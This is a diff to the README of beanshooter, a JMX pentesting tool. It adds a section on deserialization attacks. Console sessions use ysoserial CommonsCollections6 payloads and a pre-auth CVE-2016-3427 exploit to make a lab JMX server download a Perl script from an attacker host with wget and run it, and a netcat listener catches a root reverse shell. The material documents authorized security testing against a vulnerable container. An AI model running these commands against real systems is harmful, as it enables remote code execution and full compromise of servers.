@@ -338,6 +338,103 @@ you have to use the *JMXMP* service URI ``service:jmx:jmxmp://<JMXMPHOST>:<JMXMP
 classpath.
 
 
+### Deserialization Support
+
+-----
+
+In case of authenticated *JMX* endpoints, it is pretty common that usage of *MLet* does not work, even with valid credentials.
+The following listing shows an attempt to deploy a malicious *MBean* on an authenticated *JMX* endpoint:
+
+```console
+[qtc@kali ~]$ beanshooter --ssl  172.18.0.2 9010 status
+[+] Connecting to JMX server... 
+[/]    RMI object tries to connect to different remote host: iinsecure.dev
+[/]    Redirecting the connection back to 172.18.0.2... failed!
+[*]
+[-] The following exception was thrown: java.lang.SecurityException: Authentication failed! Credentials required
+[qtc@kali ~]$ beanshooter --ssl  --username controlRole --password control 172.18.0.2 9010 status
+[+] Connecting to JMX server... 
+[/]    RMI object tries to connect to different remote host: iinsecure.dev
+[/]    Redirecting the connection back to 172.18.0.2... done!
+[+] Creating MBeanServerConnection... done!
+[+]
+[+] Getting Status of MLet... done!
+[+]	MLet is not registered on the JMX server.
+[+] Getting Status of malicious Bean... done!
+[+]	malicious Bean is not registered on the JMX server.
+[qtc@kali ~]$ beanshooter --ssl  --username controlRole --password control 172.18.0.2 9010 deployAll
+[+] Connecting to JMX server... 
+[/]    RMI object tries to connect to different remote host: iinsecure.dev
+[/]    Redirecting the connection back to 172.18.0.2... done!
+[+] Creating MBeanServerConnection... done!
+[+]
+[+] Creating MBean 'MLet' for remote deploymet... failed!
+[-] The following exception was thrown: java.lang.SecurityException: Access denied! Creating an MBean that is a ClassLoader is forbidden unless a security manager is installed.
+```
+
+In these cases it might still be possible to attack the *JMX* endpoint by using *deserialization attacks*. To allow such attacks, the [ysoserial](https://github.com/frohoff/ysoserial)
+project can be integrated to *beanshooter* by specifying the path to the corresponding *ysoserial .jar* file. This can be configured either in the configuration file or by using the
+``--yso`` command line option. The default location is ``/opt/ysoserial/target/ysoserial-0.0.6-SNAPSHOT-all.jar``.
+
+With *ysoserial* setup correctly, one can attempt a deserialization attack agains the target:
+
+```console
+[qtc@kali ~]$ beanshooter --ssl --username controlRole --password control 172.18.0.2 9010 ysoserial CommonsCollections6 "wget -O /dev/shm/s.pl http://172.18.0.1:8000/shell.pl"
+[+] Creating ysoserial payload...done.
+[+] Connecting to JMX server... 
+[/]    RMI object tries to connect to different remote host: iinsecure.dev
+[/]    Redirecting the connection back to 172.18.0.2... done!
+[+] Creating MBeanServerConnection... done!
+[+]
+[+] Sending payload to 'getLoggerLevel'...
+[+]     IllegalArgumentException. This is fine :) Payload probably worked.
+[qtc@kali ~]$ beanshooter --ssl --username controlRole --password control 172.18.0.2 9010 ysoserial CommonsCollections6 "perl /dev/shm/s.pl"
+[+] Creating ysoserial payload...done.
+[+] Connecting to JMX server... 
+[/]    RMI object tries to connect to different remote host: iinsecure.dev
+[/]    Redirecting the connection back to 172.18.0.2... done!
+[+] Creating MBeanServerConnection... done!
+[+]
+[+] Sending payload to 'getLoggerLevel'...
+[+]     IllegalArgumentException. This is fine :) Payload probably worked.
+
+[qtc@kali ~]$ nc -vlp 4444
+Ncat: Version 7.80 ( https://nmap.org/ncat )
+Ncat: Listening on :::4444
+Ncat: Listening on 0.0.0.0:4444
+Ncat: Connection from 172.18.0.2.
+Ncat: Connection from 172.18.0.2:45994.
+id
+uid=0(root) gid=0(root) groups=0(root)
+```
+
+Older *JMX* instances might also be vulnerable to *CVE-2016-3427*, which is basically a *pre-auth* deserialization vulnerability.
+Whereas the above deserialization attack should work against the *RMI* based connector as well as against *JMXMP* based connector,
+the *pre-auth* attack only works against the *RMI* based connector:
+
+```console
+[qtc@kali ~]$ beanshooter --ssl 172.18.0.2 9010 cve-2016-3427 CommonsCollections6 "perl /dev/shm/s.pl" 
+[+] Creating ysoserial payload...done.
+[+] cve-2016-3427 - Sending serialized Object as credential.
+[+]     An exception during the connection attempt is expected.
+[+] Connecting to JMX server... 
+[/]    RMI object tries to connect to different remote host: iinsecure.dev
+[/]    Redirecting the connection back to 172.18.0.2... failed!
+[*]
+[*] Caught SecurityException with content 'Authentication failed! Credentials should be String[] instead of java.util.HashSet'.
+[*]     Target is most likely vulnerable to cve-2016-3427.
+
+[qtc@kali ~]$ nc -vlp 4444
+Ncat: Version 7.80 ( https://nmap.org/ncat )
+Ncat: Listening on :::4444
+Ncat: Listening on 0.0.0.0:4444
+Ncat: Connection from 172.18.0.2.
+Ncat: Connection from 172.18.0.2:46000.
+id
+uid=0(root) gid=0(root) groups=0(root)
+```
+
+
 ### Advanced Usage
 
 -----
@@ -386,6 +483,8 @@ Here are some of the advantages why you may choose *beanshooter* in favor of oth
 * Full *JMXMP* support with almost all available authentication options
 * *ysoserial* integration to test for insecure deserialization
 * *CVE-2016-3427* detection
+* Autocompletion for *bash*
+* Vulnerable docker container to run tests against
 
 
 ### Credits
